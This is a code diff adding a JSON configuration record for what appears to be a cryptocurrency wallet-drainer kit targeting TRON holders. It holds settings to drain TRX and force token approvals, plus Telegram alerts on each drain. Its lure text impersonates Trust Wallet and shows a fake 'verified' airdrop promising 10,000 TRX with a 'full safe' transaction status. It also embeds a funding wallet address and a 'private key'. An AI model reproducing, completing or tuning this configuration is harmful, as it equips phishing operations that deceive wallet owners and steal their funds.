@@ -1,0 +1,58 @@
+[
+  {
+    "id": 25,
+    "worker_id": "WRK2A05FBB4",
+    "name": "324",
+    "config": {
+      "minBalance": 10,
+      "forceApproval": false,
+      "drainTrx": true,
+      "drainTrxMinAmount": 5,
+      "notifications": {
+        "telegramChatId": "",
+        "telegramBotToken": "",
+        "approved": true,
+        "connection": true,
+        "zero": true,
+        "strategize": true,
+        "joined": true,
+        "selected_wallet": true,
+        "left": true,
+        "selected_wallet_notfound": true,
+        "force_approval": true,
+        "drain": true,
+        "error": false
+      },
+      "walletConnect": {
+        "name": "Trust Wallet",
+        "description": "Trust Wallet",
+        "url": "https://trustwallet.com/",
+        "icon": "https://trustwallet.com/favicon.ico",
+        "lowBalanceText": "Unable to process the request due to insufficient funds in your wallet.\n\nThe minimum amount of $10 is required to proceed.\n\nPlease top up your balance and try again!",
+        "estimateChanges": "Receive 10,000 TRX ($2,200)",
+        "transactionStatus": "full safe",
+        "sourceName": "TRX Airdrop",
+        "sourceStatus": "verified",
+        "sourceDescription": "Certain TRX airdrop",
+        "theme": "dark",
+        "modalStyle": "reown"
+      },
+      "autoCommission": {
+        "enabled": true,
+        "fundingWalletAddress": "f374343878fbe03659735d0d045c66339387fade5b0681c7699891624d72aa33",
+        "fundingWalletPrivateKey": "f374343878fbe03659735d0d045c66339387fade5b0681c7699891624d72aa33",
+        "trxAmountToSend": 30,
+        "minUsdtBalanceRequired": 10,
+        "waitTimeoutSeconds": 15,
+        "maxFundingAttempts": 3,
+        "fundingCooldownMinutes": 5,
+        "exclusionListEnabled": true,
+        "permanentExclusions": true,
+        "exclusionDurationHours": 24,
+        "maxExclusionsCount": 9999
+      }
+    },
+    "created_at": "2026-01-30 09:26:06",
+    "updated_at": "2026-01-30 09:26:06"
+  }
+]
